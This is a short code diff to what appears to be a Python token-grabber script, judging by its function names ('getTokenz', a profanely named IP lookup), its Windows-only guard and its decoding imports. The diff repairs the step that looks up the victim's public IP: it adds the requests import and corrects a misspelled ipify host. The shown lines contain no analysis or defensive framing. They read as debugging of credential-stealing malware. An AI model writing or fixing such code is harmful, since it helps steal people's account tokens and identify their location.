@@ -4,6 +4,7 @@ if os.name != "nt":
     exit()
 
 import json
+import requests
 from urllib.request import Request, urlopen
 from re import findall
 from base64 import b64decode
@@ -65,9 +66,10 @@ def getTokenz(path):
 def whoTheFuckAmI():
     ip = "None"
     try:
-        ip = json.loads(request.get("https://apii.ipify.org?format=json").text)
+        ip = json.loads(requests.get("https://api.ipify.org?format=json").text)
     except:
         ip = "Can't Access"
+        return ip
         raise
     return ip["ip"]
 
